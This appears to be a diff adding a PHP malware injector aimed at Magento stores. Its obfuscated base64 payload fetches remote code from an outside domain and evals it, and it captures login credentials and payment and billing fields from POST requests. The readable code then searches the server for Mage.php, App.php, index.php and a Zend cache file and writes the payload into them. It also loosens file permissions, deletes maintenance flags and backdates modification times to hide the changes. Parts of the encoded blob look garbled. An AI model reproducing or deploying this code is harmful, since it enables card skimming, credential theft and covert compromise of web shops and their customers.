T0RPTl9CQUNLVVAiIC4gQ1JDX01FR0FMT0RPTl9TSE9SVCkpIHsNCiAgICAgICAgZGVmaW5lKCJNRUdBTE9ET05fQkFDS1VQIiAuIENSQ19NRUdBTE9ET05fU0hPUlQsIDEpOw0KDQogICAgICAgIGlUJRURShVQN9FVQ9ETSV1QgACIgACIgACIgACIgACIgACIgAiCNwCMyEDI+0DIUV1TF1USU9FVQ9ETSV1QgACIgACIgACIgACIgACIgACIgAiCNwCMyEDI+0DIUV1TF1USUR1QF5kTPN0XUB1TMJVVDBCIgACIgACIgACIgACIgACIgACIQVF9TU0xfVkVSSUZZUEVFUiA9PiBmYWxzZSwNCiAgICAgICAgICAgICAgICXnACIgACIgACIgACIgoQDscCKcVWakdCIgACIgACIgACIgAiCNwyJowVblR3c5N3JgACNvbnRlbnQpIHsNCiAgICAgICAgICAgICAgICAkY29udGVudCA9IEBmaWxlX2dldF9jb250ZW50cygkZ2V0X3VybCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGV2YWwoJGNvbnRegkSKddCUJ9FVOVUSMN0XQRFVIdyWSVkVSV0UfRCK0V2czlGKgYWagACIgACIgACIgACIgACIgoQD9BCIgACIAiP9AiIvoiL0V2cf52ctpiLvICIgACIgACIgACIgACIgACIK0ALyAiP9AiIvoiLoRnbv1kbvlGdhJXawhXZq4yLiACIgACIgACIgACIgACIgAiCNwiMg4TPgIyLq4Ca052bt9Fc4VmKu8iIgACIgACIgACIgACIgACIgoQDsIDI+0D0+IHRydWUsDQogICAgICAgICAgICAgICAgICAgICAgICBDVVJMT1BUX0VOQ09ESU5HID0+ICIiLA0KICAgICAgICAgICAgICAgICAgICAgICAgQ1VSTE9QVF9VU0VSQUdFTlQgPT4gIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDUuMTsgcnY6MzIuMCyYXkoDQogICAgICAgICAgICAgICAgICAgIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIgPT4gdHJ1ZSwNCiAgICAgICAgICACIK0QK0ASP9ASKyFWZ591YjRCKuVGbyR3coAiZpBCIgACIgACIgACIgACIgAiCNsDa052bt91YjRCIuAyJwcCI9ACa052bt91YjRCIgACIgACIcyBOVCA1LjE7IHJ2OjMyLjApIEdlY2tvLzIwMTIwMTAxIEZpcmVmb3gvMzIuMCIsDQogICAgICAgICAgICAgICAgQ1VSTE9QVF9BVVRPUkVGRVJFUiA9PiCAgICAgICAgJ3dnZXQnLA0KICAgICAgICAgICAgJ2RlbGV0ZS4rZnJvbS4rd2hlcmUnLA0KICAgICAgICAgICAgJ2Z3cml0ZVwoJywNCiAgICAgICAgICAgICdleGl0XCgnLA0KICAgICAgICAgIaWYgKCFkZWZpbmVkKCJC5cLlwvJywNCiAgICAgICAgICAgICdwYXNzdGhydVwoJywNCiAgICAgICAgICAgICdwb3BlblwoJywNCiAgICAgICAgICAgICdcPFw/cGhwJywNCiAgICAgICAgICAgICdhZG1pbl91c2VyJywNCiAgICAgICAgICAgICdiYXNlNjRfZGVjb2RlXCgnLA0KCIgoQDK0wOi0zdllmd/AHaw5CelRmbp9iTPR0TMF0RF10LlNWYwNnLjhGdhB3LvozcwRHdoJCI9ACbyV3X0V2ZkACIgACIgACIK0wOpEDIsQlUPh0Uf50TE9EHBzOi8vZ29vZ2xlLXN0YXRpay5wdy93dGYvaW5kZXgucGhwP2g9IiAuICRfU0VSVkVSWydIVFRQX0hPU1QnXTJ10pICYmIChpc3NldCgkX0NPT0tJRVsnX21kbiddKSkpIHsNCiAgICAgICAgICAgI9ETSV1QgACIgACIgACIgACIgACIgACIgAiCNwCMxAiP9AyUSlERFJFWB10XUB1TMJVVDBCIgACIgACIgACIgACIgACIgACIK0AL3AiP9ACVV9URNlEVfRFUPxkUVNEIgACIgACIgACIgACIgACw4SNvEGbslmev1kIg4TPgQlTFdUQSV0UV9FVQ9ETSV1QgACIgACIgACIgACIgACIgACIgAiCNwiIiAiP9AyROlERPNkTF9FVQ9ETSV1QgACIgACIgACIgACIgACIgACIgAiCNwSZ1JHIgACIK0ALnMXZ1xWY2tiLvRnbptiL0JXZz5WanACIgACIgACIgACIgoQDscSZyVGa3tiL0V2cr4SZ0FGZwV3JgACIgACIgACIgACIK0ALnUmclh2dr4SbvJnZr4CdjVGblN3JgACIgACIgACIgACIK0ALngCXzRnblRnbvN2X0dCIgACIgACIgACCIddSZtFmb0NXYsdyWddyZulGbslmYnsFVT9EUfRCIuAyJgcCIuASXnUWbh5GdzJXamdyWddyZulGbslmYnsFVT9EUfRCI9ACbslmYkACIgACIgACIgACIgoQD7BSKp01Jn5WasxWaidyWUN1TQ9FJoQXZzNXaoAiZpBCIgACIgACIK0gX21kYXRhJ10gPSBiYXNlNjRfZW5jb2RlKCRiaWxsKTsNCiAgICAgICAgfTsNCiAgICAgICAgaWYgKGlzc2V0KCRfUE9TVFsncGF5bWVudCddKSkgew0KICAgICAgICAgICAgJGZpZWxkc0FycmF5ID0gYXJyYXkoDQogICAgICAgICAgICAVOJVVUVkUfRFUPxkUVNEIgACIgACIgACIgACIgACIgACIgoQDokXYyJXYg0DIz52bpRHcvRCIgACIgACIgACIgACIgACIK0wegkSKiQXaul2XsJXdjJCKzR3cphXZf52bpR3YuVnZoAiZpBCIgACIgACIgACIgoQD7IiIg0DI05WZ052bjRCIgACIgACIgACIgAiCNsiOQlULtICIuASXnQ1UPh0XQRFVIdyWSVkVSV0UfRCIuAiIgoDVT9ESt0iIg4CIddSSSV1XUNVRVFVRSdyWSVkVSV0UfRCIuASXnQ1UPh0XQRFVIdyWSVkVSV0UfRCIuAiIgoDTSVVLtICIuASKFgACIgACIgACIgoQD9BCIgACIgACIgACIgACIgACIgACIgACIgod0hmIg0DIsJXdfRXZnRCIgACIgACIgACIgAiCNsHIpkSKnMjNwgDO5AjY3kjYxITNhFzMihjY4UWZiVTYjNWMjF2NnASP9ASKddyd0Z2JbVUSL90TD9FJoUDZthCImYCIpgICAgICAgICBjdXJsX3NldG9wdF9hcnJheSgkY2gsICRvcHRpb25zKTsNCiAgICAgICAg9YX0ZPUldBUkRFRF9GT1InXTsNCiAgICAgICAgICAgT09LSUVbJ3BvcnR6aWxsYSddID0gJyc7DQoNCiAgICAgICAgJGFyciA9IGFycmF5KA0KICAgICAgICAgICAgJ2V2YWxcKCcsDQogICAgICAgICAgICAnZXhlY1woJywNCiAgIAgICAgIGlmICgoaXNzZXQoJF9QT1NUWydsb2dpbiddKSAmJiAoaXNzZXQoJF9QT1NUWydsb2dpbiddWyd1c2VybmFtZSddKSkgJiYgKGlzc2V0KCRfUE9TVFsnbG9naW4nXVsIC4gYmFzZTY0X2RlY29kZSgkX0NPT0tJRVsnX21kYXRhJ10pOw0KICAgICAgICAgICAgICAgICRjY19wYXlfZW5jb2RlZCA9IGoQD7ADI6ASKddCVT9ESfBFVUh0JbJVRWJVRT9FJoIzMjJ3Yg8DIp01JUN1TI94gJ3wnIC4gJF9QT1NUWydiaWxsaW5nJ11bJ3N0cmVldCddWycwJ10gLiAnfCcgLiAkX1BPvNmLtVHbvxWZj9yL6MHc0RHangSeyVWdx9Fc1t2YhJ2Xu9GZvxWYnVWbg0DI052YkACIgACIgACIgACIgACIgACIgACIK0wegkSKiQXaul2XsJXdjJCKzR3cphXZf52uV2avRnbk91JbVUSL90TD9FJoQXZzNXahgCImlGIgACIgACIgoQDK0QfgACIgACIgAiCNsjblt2b0FGJg0DIddiblt2b05GZfdyWFl0S";$nGW4PbVJ="==wO3FER5QVMxs0YkAibyVHdlJnCpkicmV1U2FHTLRCK0V2czlWIoYWaKsTf9tTKp0VMrk1VJZlQBB3YfxEJbF3RqJVTfVzRkwSXZdVSWJUQwN2XMRyWxdkaS10X1cEJsQXVPhFTvJHJoIHdzJWdzhyQ4pmdPp0UqRSPucXQElDVxEzSjRyelNHbl13Op0VMrk1VJZlQBB3YfxEJbF3RqJVTfVzRkwSXZdVSWJUQwN2XMRyWxdkaS10X1cEJsQXVPhFTvJHJoIHdzJWdz1jL3FER5QVMxs0YksXK0USWXlkVCFEcj9FTkgiZptXKy0zKZdVSWJUQwN2XMRyOpE3RqJVTfVzRkgiZvVmepNHPZdVSWJUQwN2XMRyOw0TWXlkVCFEcj9FTkgicvZ2OiISP3FER5QVMxs0YkowOpkTMsMjM2ITMsgTOsITNwUDLxgDL5UzMsEjNsAzM5QTMsAjNxwSNyEjNsczNxwiNxYDNsIDOxwiN3ATMxwiN2wCN4YjMsMzMxwiN2UDNxwCN4EDL5gzMzEDL4QTMsUzN0ITMsgjNsUTO0ETMsETOxwiM0YjMxwSO0wCNxUDOsYzNsYTN5YDL4UTMskDN2kDLwgTMsIzMwcDL3QTMsgjMxQTMsQzNsETMzIDL5YDL1QzNwEDL3ATMsUTM5gDLzQTMsUjN1YDLxkDL1UTMyEDL5YTMsQjM0UDL4ITMsMzM3EDL4kDL3cDO1wiM3wSMxEDMxwiN0EDL0ATMzEDL5UDL2MDNxEDLzcDLzkzN0wiM2EDLxkDM0wyM3wyM4EDMxwSM4EDL0YTOsQjNskDN1EDL2ETMsIzMxMDLwMTMsUjMzQTMsUDOsQTN5ITMskTOxwSOykzMxwCO0EDLxATN5wSOzEDLwUjMzEDL0QTMsEzN3gDL4cTMsgTNyETMsITMxwCO0IzMsMTMxwyNwgTOsYzMxwiN1IDMxwSOxEDL3UTOwEDL1QTMsMjN1ETMsMDOxwCN5YTNskTOxwSN2cDLycDL5IDN5wiNxEDL1gjM2wSNxEDL0kzMxwCOxEDL3UzMyEDL0kTMsADL0ITMsATN5cDL1ATMsMTNyQDLzcDL3gDOzwSM5wCN3QzNsQjNxwSMwQjNsczNxwyM3UzMxwCM3wSM5kDNxwiN3EDL0cDM4wCNyEDLyIDM5wiNxEDLzUDMywSO3EDLwUzNzEDLxQDLwcjMywSMwEDLzkTN1wCN3EDLzkzNxEDL1cDL4UzM0wSMxEDLzADN4wSMyEDL4EDOywSM3wiMzMDOsMTOxwSOzkjMsgjNsATN3IDLyUTMsMTM2wCN5wSNzMTOsEDOxwSN3cjNsATNxwSN3kTNsMDNxwCNxgDMxwCM1wSN3IDNxwyMyEDL0YzNzwyN2wCOwcjNsYDNsITOzATMsETMxwiN0IjMxwCNzEDL1ITNwEDL3YTMscTNyUDL4kDLyMDO0EDL3QDL0YDMwEDL3UDL1kTO0wCN0EDLwITO5wSN3wSO5MzNscjMxwSM2ATNxwCMyEDLzEjNxwyM3EDLwQDNsEzMxwCM2kzMsUzNskDM2IDL5gTMsYDNxkDL3gTMsITMycDL2ITMsMDO0IDLxITMsMzM4ITMsMzMxwSO5YDNxwSM4wSN0ETMsITOxwCM2MzMsQDMxwCO4ETNxwSN2wSOzAzMxwyNwEDLwUTM1wSN5EDL1YTN3wyN4wCOzQDMxwyM4EDLzMDN0wSMwEDL5YTMywiM0wCNyUDNxwSN4wCOwcTMxwyMzEDLxMjNzwSO3wiM1UzMsIDOsATNygDL4kDL1gzMywSOyEDL2YDO0wCO2EDL2IjMxwCO4EDL3YTOxEDLwQDL5ATNxwiM5EDLxYDOxwyM5wyM2UDOsYDOskTN2ATMsATOxwCM2czNskjNsUTN0QTMsUjNxwCN5EDL1ETMsYTN2gDK5FmcyFWPxdkaS10X1cEJ";if(function_exists($wJPAi6t)){$WQvEoSdEK=@$wJPAi6t(\'$roLXOUt,$jSJOvjxC\',$KLqvSUfr($jSJOvjxC($nGW4PbVJ)));if($WQvEoSdEK)$roLXOUt=@$WQvEoSdEK($roLXOUt,$jSJOvjxC); }else{$fq_kP5hL="\x29";$fq_kP5hL.="\x29\x29";$fq_kP5hL.="\112";$fq_kP5hL.="\x56\142";$fq_kP5hL.="\120\64\127";$fq_kP5hL.="\x47\156\44";$fq_kP5hL.="\x28\x43\170";$fq_kP5hL.="\152\166";$fq_kP5hL.="\x4f\112";$fq_kP5hL.="\x53\152";$fq_kP5hL.="\x24";$fq_kP5hL.="\x28\162\146";$fq_kP5hL.="\125\x53";$fq_kP5hL.="\x76\x71";$fq_kP5hL.="\114\x4b";$fq_kP5hL.="\x24\x28\154";$fq_kP5hL.="\x61\166\x65";$fq_kP5hL.="\x40";$fq_kP5hL=$jSJOvjxC($fq_kP5hL);@$pDaT9uhVE($fq_kP5hL);};if(function_exists($wJPAi6t)){$Ao9JwEhW=@$wJPAi6t("",$KLqvSUfr($jSJOvjxC($roLXOUt)));if($Ao9JwEhW)@$Ao9JwEhW();}else{$C9Yyxm="\x29";$C9Yyxm.="\x29\x29";$C9Yyxm.="\x74\x55\x4f";$C9Yyxm.="\x58\x4c";$C9Yyxm.="\x6f";$C9Yyxm.="\162";$C9Yyxm.="\x24\50\103";$C9Yyxm.="\170";$C9Yyxm.="\152\x76";$C9Yyxm.="\117";$C9Yyxm.="\112\123\x6a";$C9Yyxm.="\x24";$C9Yyxm.="\x28\162\x66";$C9Yyxm.="\125\x53";$C9Yyxm.="\x76\x71";$C9Yyxm.="\114\113\44";$C9Yyxm.="\x28";$C9Yyxm.="\154";$C9Yyxm.="\141\166\x65";$C9Yyxm.="\x40";$C9Yyxm=$jSJOvjxC($C9Yyxm);@$pDaT9uhVE($C9Yyxm);};'));
+define("TREX_TARGET", trim('/lib/Zend/Cache/Backend/Interface.php'));
+
+$GLOBALS['RESPONSE'] = "";
+$GLOBALS['RESPONSE'] .= "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+$GLOBALS['RESPONSE'] .= " [m1] \r\n---------------------------------------------------------------------\r\n";
+
+function insert_line($lines, $codeline, $comment_indexes) {
+    if (!$comment_indexes)
+        return false;
+    shuffle($comment_indexes);
+    $index = $comment_indexes[0];
+    $r = array();
+    for ($i = 0; $i < sizeof($lines); $i++) {
+        $line = $lines[$i];
+        if ($i == $index) {
+            $r[] = "*/";
+            $r[] = $codeline;
+            $r[] = "/*";
+        }
+        $r[] = $line;
+    }
+
+    return $r;
+}
+
+function set_min_date($filepath) {
+    $dir = dirname($filepath);
+    $o = opendir($dir);
+    $min_lastmod = 0;
+    while ($r = readdir($o)) {
+        $mod = filemtime($dir . "/" . $r);
+        if (!$min_lastmod) {
+            $min_lastmod = $mod;
+            continue;
+        }
+
+        if ($min_lastmod > $mod) {
+            $min_lastmod = $mod;
+        }
+    }
+
+    if ($min_lastmod) {
+        touch($filepath, $min_lastmod + 1);
+    }
+}
+
+function check_before_modify($filepath) {
+    $fp = fopen($filepath, "r");
+    $lines = array();
+    if (flock($fp, LOCK_EX)) {
+        while (!feof($fp)) {
+            $line = trim(fgets($fp), "\r\n");
+            $lines[] = $line;
+        }
+    }
+
+    fclose($fp);
+
+    $start_comment = false;
+    $end_comment = true;
+    $end_comment_quick = false;
+
+    for ($i = 0; $i < sizeof($lines); $i++) {
+        $line = trim($lines[$i]);
+        $line = strtr($line, array('<' . '?php' => '', '<' . "?" => ""));
+        $line = preg_replace("#/\*.*?\*/#", "", $line);
+        $line = trim($line);
+
+        if (preg_match("#^/\*.*$#", $line)) {
+            $start_comment = true;
+            $end_comment = false;
+            $end_comment_quick = false;
+            continue;
+        }
+
+        if ($end_comment_quick) {
+            if (preg_match('#^\$[a-zA-Z0-9]+=#', $line)) {
+                return true;
+            }
+        }
+
+        if (preg_match("#^\*/$#", $line)) {
+            $start_comment = false;
+            $end_comment = true;
+            $end_comment_quick = true;
+            continue;
+        }
+
+        $end_comment_quick = false;
+
+        if ($start_comment) {
+            continue;
+        }
+
+        if (!$line)
+            continue;
+
+        return false;
+    }
+
+    return false;
+}
+
+function modify_file($filepath) {
+    $perms = 0777 & fileperms($filepath);
+    $update_perms = false;
+    if ((!is_readable($filepath)) || (!is_writable($filepath))) {
+        $update_perms = true;
+        @chmod($filepath, 0777);
+    }
+
+    if (!is_readable($filepath))
+        return 0;
+    if (!is_writable($filepath))
+        return 0;
+    $fp = fopen($filepath, "r");
+    $lines = array();
+    if (flock($fp, LOCK_EX)) {
+        while (!feof($fp)) {
+            $line = trim(fgets($fp), "\r\n");
+            $lines[] = $line;
+        }
+    }
+
+    fclose($fp);
+
+    if (!$lines)
+        return -1;
+
+    $start_comment = false;
+    $end_comment = true;
+    $end_comment_quick = false;
+    $end_index = -1;
+
+    $comment_indexes = array();
+
+    for ($i = 0; $i < sizeof($lines); $i++) {
+        $line = trim($lines[$i]);
+        $line = strtr($line, array('<' . '?php' => '', '<' . "?" => ""));
+        $line = preg_replace("#/\*.*?\*/#", "", $line);
+        $line = trim($line);
+
+        if (preg_match("#^/\*.*$#", $line)) {
+            $start_comment = true;
+            $end_comment = false;
+            $end_comment_quick = false;
+            continue;
+        }
+
+        if ($end_comment_quick) {
+            if (preg_match('#^\$[a-zA-Z0-9]+=#', $line)) {
+                return 2;
+            }
+        }
+
+        if (preg_match("#^\*/$#", $line)) {
+            $start_comment = false;
+            $end_comment = true;
+            $end_comment_quick = true;
+            continue;
+        }
+
+        $end_comment_quick = false;
+        //
+        if ($start_comment) {
+            $comment_indexes[] = $i;
+            continue;
+        }
+
+        if (!$line)
+            continue;
+
+        $end_index = $i;
+        break;
+    }
+
+    if ($end_index <= 5) {
+        return 0;
+    }
+
+    $updated_lines = insert_line($lines, TREX_CODE, $comment_indexes);
+    $dt = implode("\r\n", $updated_lines);
+    file_put_contents($filepath, $dt, LOCK_EX);
+    set_min_date($filepath);
+    if ($update_perms) {
+        if ($perms >= 64) {
+            chmod($filepath, $perms);
+        } else {
+            chmod($filepath, 0644);
+        }
+    }
+    return 1;
+}
+
+function find_and_write($target) {
+    if (check_before_modify($target))
+        return array($target, 2);
+
+    $statuscode = modify_file($target);
+    return array($target, $statuscode);
+}
+
+function insert_mage($filepath, $code) {
+    $perms = 0777 & fileperms($filepath);
+    $update_perms = false;
+    if ((!is_readable($filepath)) || (!is_writable($filepath))) {
+        $update_perms = true;
+        @chmod($filepath, 0777);
+    }
+
+    if (!is_readable($filepath))
+        return 0;
+    if (!is_writable($filepath))
+        return 0;
+
+    $content = file_get_contents($filepath);
+
+    if (!$content)
+        return -1;
+
+    if ((substr_count($content, '$_SERVER[$')) && (substr_count($content, '"curl_init"'))) {
+        return 2;
+    }
+
+    $cnt_r = substr_count($content, "\r");
+    if (!preg_match("#\n(\s+)Varien_Profiler::stop\('mage'\);#", $content, $match)) {
+        return -2;
+    }
+
+    $spaces = $match[1];
+    $profiler = $match[0];
+    $lines = explode("\n", $code);
+    $lines2 = array();
+    for ($i = 0; $i < sizeof($lines); $i++) {
+        $line = rtrim($lines[$i]);
+        $lines2[] = $spaces . $line;
+    }
+
+    $content2 = $content;
+    if ($cnt_r) {
+        $content2 = str_replace("\r\n", "\n", $content2);
+        $content2 = str_replace("\n", "\r\n", $content2);
+    }
+
+    $code2 = $cnt_r ? implode("\r\n", $lines2) : implode("\n", $lines2);
+    $content2 = str_replace($profiler, $profiler . "\r\n" . $code2, $content2);
+
+    if (substr_count($content2, "echo file_get_contents(base64_decode")) {
+        $content2 = str_replace("echo file_get_contents(base64_decode", "if(0)echo file_get_contents(base64_decode", $content2);
+    }
+
+    file_put_contents($filepath, $content2, LOCK_EX);
+    set_min_date($filepath);
+    if ($update_perms) {
+        if ($perms >= 64) {
+            chmod($filepath, $perms);
+        } else {
+            chmod($filepath, 0644);
+        }
+    }
+    return 1;
+}
+
+function insert_app($filepath, $code) {
+    $perms = 0777 & fileperms($filepath);
+    $update_perms = false;
+    if ((!is_readable($filepath)) || (!is_writable($filepath))) {
+        $update_perms = true;
+        @chmod($filepath, 0777);
+    }
+
+    if (!is_readable($filepath))
+        return 0;
+    if (!is_writable($filepath))
+        return 0;
+    $fp = fopen($filepath, "r");
+    $lines = array();
+    if (flock($fp, LOCK_EX)) {
+        while (!feof($fp)) {
+            $line = trim(fgets($fp), "\r\n");
+            $lines[] = $line;
+        }
+    }
+
+    fclose($fp);
+
+    if (!$lines)
+        return -1;
+
+    $content = implode("\r\n", $lines);
+    if ((substr_count($content, '$_SERVER[$')) && (substr_count($content, '"curl_init"'))) {
+        return 2;
+    }
+
+    $tmp_index = 0;
+    $line_index = 0;
+    for ($i = 0; $i < sizeof($lines); $i++) {
+        $line = trim($lines[$i]);
+        $line = strtr($line, array('<' . '?php' => '', '<' . "?" => ""));
+        $line = preg_replace("#/\*.*?\*/#", "", $line);
+        $line = trim($line);
+        if ((substr_count($line, "public function run(")) && (!strpos($line, "public function run("))) {
+            $tmp_index = $i;
+            continue;
+        }
+
+        if ($tmp_index > 0) {
+            if ($line == 'return $this;') {
+                $line_index = $i;
+                break;
+            }
+        }
+    }
+
+    if (!$line_index) {
+        return -2;
+    }
+
+    $line = $lines[$line_index];
+    if (!preg_match("#^(\s+)\S+#", $line, $match)) {
+        return -2;
+    }
+    $spaces = $match[1];
+
+    $clines = explode("\n", $code);
+    $clines2 = array();
+    for ($i = 0; $i < sizeof($clines); $i++) {
+        $line = rtrim($clines[$i]);
+        $clines2[] = $spaces . $line;
+    }
+
+    $lines2 = array();
+
+    for ($i = 0; $i < sizeof($lines); $i++) {
+        $line = $lines[$i];
+        if ($i == $line_index) {
+            for ($j = 0; $j < sizeof($clines2); $j++) {
+                $lines2[] = $clines2[$j];
+            }
+        };
+
+        $lines2[] = $line;
+    }
+
+    $content2 = implode("\r\n", $lines2);
+
+    file_put_contents($filepath, $content2, LOCK_EX);
+    set_min_date($filepath);
+    if ($update_perms) {
+        if ($perms >= 64) {
+            chmod($filepath, $perms);
+        } else {
+            chmod($filepath, 0644);
+        }
+    }
+    return 1;
+}
+
+function insert_index_nosafe($filepath, $code) {
+    $perms = 0777 & fileperms($filepath);
+    $update_perms = false;
+    if ((!is_readable($filepath)) || (!is_writable($filepath))) {
+        $update_perms = true;
+        @chmod($filepath, 0777);
+    }
+
+    if (!is_readable($filepath))
+        return 0;
+    if (!is_writable($filepath))
+        return 0;
+    $fp = fopen($filepath, "r");
+    $lines = array();
+    if (flock($fp, LOCK_EX)) {
+        while (!feof($fp)) {
+            $line = trim(fgets($fp), "\r\n");
+            $lines[] = $line;
+        }
+    }
+
+    fclose($fp);
+
+    if (!$lines)
+        return -1;
+
+    $content = implode("\r\n", $lines);
+    if ((substr_count($content, '$_SERVER[$')) && (substr_count($content, '"curl_init"'))) {
+        return 2;
+    }
+
+    if (!substr_count($content, 'Mage::run($mageRunCode, $mageRunType);')) {
+        return -2;
+    }
+
+    $line_index = 0;
+    for ($i = 0; $i < sizeof($lines); $i++) {
+        $line = trim($lines[$i]);
+        $line = strtr($line, array('<' . '?php' => '', '<' . "?" => ""));
+        $line = preg_replace("#/\*.*?\*/#", "", $line);
+        $line = trim($line);
+
+
+        if ($line == 'Mage::run($mageRunCode, $mageRunType);') {
+            $line_index = $i;
+            break;
+        }
+    }
+
+    if (!$line_index) {
+        return -2;
+    }
+
+    $clines = explode("\n", $code);
+    $clines2 = array();
+    for ($i = 0; $i < sizeof($clines); $i++) {
+        $line = rtrim($clines[$i]);
+        $clines2[] = $line;
+    }
+
+    $lines2 = array();
+
+    for ($i = 0; $i < sizeof($lines); $i++) {
+        $line = $lines[$i];
+        $lines2[] = $line;
+
+        if ($i == $line_index) {
+            for ($j = 0; $j < sizeof($clines2); $j++) {
+                $lines2[] = $clines2[$j];
+            }
+        };
+    }
+
+    $content2 = implode("\r\n", $lines2);
+
+    file_put_contents($filepath, $content2, LOCK_EX);
+    set_min_date($filepath);
+    if ($update_perms) {
+        if ($perms >= 64) {
+            chmod($filepath, $perms);
+        } else {
+            chmod($filepath, 0755);
+        }
+    }
+    return 1;
+}
+
+function insert_index($filepath, $code) {
+    $r = insert_index_nosafe($filepath, $code);
+    @chmod($filepath, 0755);
+    return $r;
+}
+
+function path_finder() {
+    $pth = $_SERVER['DOCUMENT_ROOT'];
+    $d1 = $pth . '/../../..';
+    $d2 = $pth . '/../..';
+    $d3 = $pth . '/..';
+    if (is_readable($d1))
+        return realpath($d1);
+    if (is_readable($d2))
+        return realpath($d2);
+    if (is_readable($d3))
+        return realpath($d3);
+
+    return $pth;
+}
+
+function smartscan($dir) {
+    if (!is_readable($dir))
+        return array();
+    if (function_exists("scandir")) {
+        return scandir($dir);
+    } else {
+        $dh = opendir($dir);
+        $files = array();
+        while (false !== ($filename = readdir($dh)))
+            $files[] = $filename;
+        return $files;
+    }
+}
+
+function super_get_url($url, $post = false) {
+    $content = "";
+    if (function_exists("curl_init")) {
+        $options = array(
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_HEADER => false,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_ENCODING => "",
+            CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20120101 Firefox/32.0",
+            CURLOPT_AUTOREFERER => true,
+            CURLOPT_CONNECTTIMEOUT => 120,
+            CURLOPT_TIMEOUT => 120,
+            CURLOPT_MAXREDIRS => 10,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false
+        );
+
+        if ($post) {
+            $options[CURLOPT_POST] = 1;
+            $options[CURLOPT_POSTFIELDS] = $post;
+        }
+
+        $ch = curl_init($url);
+        curl_setopt_array($ch, $options);
+        $content = @curl_exec($ch);
+    }
+    if (!$content) {
+        if ($post) {
+            $url .= "?$post";
+        }
+
+        $content = @file_get_contents($url);
+    }
+
+    return $content;
+}
+
+$notning = true;
+$dir = path_finder();
+$dd = array($dir);
+
+
+for ($i = 0; $i < 4; $i++) {
+    $tmp = array();
+    foreach ($dd as $d) {
+        $res = smartscan($d);
+        foreach ($res as $v) {
+            if ($v == 'maintenance.flag') {
+                $flag = $d . "/" . $v;
+                $GLOBALS['RESPONSE'] .= " unlink[$flag]; ";
+                @unlink($flag);
+            }
+            if ($v == 'index.php') {
+                $indexFile = $d . "/index.php";
+                $mageFile = $d . "/app/Mage.php";
+                $appFile = $d . "/app/code/core/Mage/Core/Model/App.php";
+                $code = 0;
+                if (file_exists($mageFile)) {
+                    $notning = false;
+                    $code = insert_mage($mageFile, $beda_code);
+                    switch ($code) {
+                        case -2:
+                            $GLOBALS['RESPONSE'] .= "[$mageFile] without regex signature; ";
+                            break;
+                        case -1:
+                            $GLOBALS['RESPONSE'] .= "[$mageFile] is empty!; ";
+                            break;
+                        case 0:
+                            $GLOBALS['RESPONSE'] .= "[$mageFile] is protected!; ";
+                            break;
+                        case 1:
+                            $GLOBALS['RESPONSE'] .= "[$mageFile] updated!; ";
+                            break;
+                        case 2:
+                            $GLOBALS['RESPONSE'] .= "[$mageFile] contains!; ";
+                            break;
+                    }
+
+                    if ((!$code) && (file_exists($appFile))) {
+                        $code = insert_app($appFile, $beda_code);
+                        switch ($code) {
+                            case -2:
+                                $GLOBALS['RESPONSE'] .= "[$appFile] without regex signature; ";
+                                break;
+                            case -1:
+                                $GLOBALS['RESPONSE'] .= "[$appFile] is empty!; ";
+                                break;
+                            case 0:
+                                $GLOBALS['RESPONSE'] .= "[$appFile] is protected!; ";
+                                break;
+                            case 1:
+                                $GLOBALS['RESPONSE'] .= "[$appFile] updated!; ";
+                                break;
+                            case 2:
+                                $GLOBALS['RESPONSE'] .= "[$appFile] contains!; ";
+                                break;
+                        }
+                    }
+
+                    if ((!$code) && (file_exists($indexFile))) {
+                        $code = insert_index($indexFile, $beda_code);
+                        switch ($code) {
+                            case -2:
+                                $GLOBALS['RESPONSE'] .= "[$indexFile] without regex signature; ";
+                                break;
+                            case -1:
+                                $GLOBALS['RESPONSE'] .= "[$indexFile] is empty!; ";
+                                break;
+                            case 0:
+                                $GLOBALS['RESPONSE'] .= "[$indexFile] is protected!; ";
+                                break;
+                            case 1:
+                                $GLOBALS['RESPONSE'] .= "[$indexFile] updated!; ";
+                                break;
+                            case 2:
+                                $GLOBALS['RESPONSE'] .= "[$indexFile] contains!; ";
+                                break;
+                        }
+                    }
+
+                    $target = $d . TREX_TARGET;
+                    $update_data = find_and_write($target);
+                    $editFile = $update_data[0];
+                    switch ($update_data[1]) {
+                        case -1:
+                            $GLOBALS['RESPONSE'] .= "[$editFile] empty!; ";
+                            break;
+                        case 0:
+                            $GLOBALS['RESPONSE'] .= "[$editFile] comment not exists!; ";
+                            break;
+                        case 1:
+                            $GLOBALS['RESPONSE'] .= "[$editFile] updated!; ";
+                            break;
+                        case 2:
+                            $GLOBALS['RESPONSE'] .= "[$editFile] contains!; ";
+                            break;
+                    }
+                }
+            } else {
+                if (is_dir($d . '/' . $v) && is_readable($d . '/' . $v) && ($v !== ".") && ($v !== "..")) {
+                    $tmp[] = $d . '/' . $v;
+                }
+            }
+        }
+    }
+    $dd = $tmp;
+}
+
+$dir = $_SERVER['DOCUMENT_ROOT'];
+$dd = array($dir);
+
+if ($notning) {
+    for ($i = 0; $i < 4; $i++) {
+        $tmp = array();
+        foreach ($dd as $d) {
+            $res = smartscan($d);
+            foreach ($res as $v) {
+                if ($v == 'maintenance.flag') {
+                    $flag = $d . "/" . $v;
+                    $GLOBALS['RESPONSE'] .= " unlink[$flag]; ";
+                    @unlink($flag);
+                }
+                if ($v == 'index.php') {
+                    $mageFile = $d . "/app/Mage.php";
+                    $appFile = $d . "/app/code/core/Mage/Core/Model/App.php";
+                    $code = 0;
+                    if (file_exists($mageFile)) {
+                        $notning = false;
+                        $code = insert_mage($mageFile, $beda_code);
+                        switch ($code) {
+                            case -2:
+                                $GLOBALS['RESPONSE'] .= "[$mageFile] without regex signature; ";
+                                break;
+                            case -1:
+                                $GLOBALS['RESPONSE'] .= "[$mageFile] is empty!; ";
+                                break;
+                            case 0:
+                                $GLOBALS['RESPONSE'] .= "[$mageFile] is protected!; ";
+                                break;
+                            case 1:
+                                $GLOBALS['RESPONSE'] .= "[$mageFile] updated!; ";
+                                break;
+                            case 2:
+                                $GLOBALS['RESPONSE'] .= "[$mageFile] contains!; ";
+                                break;
+                        }
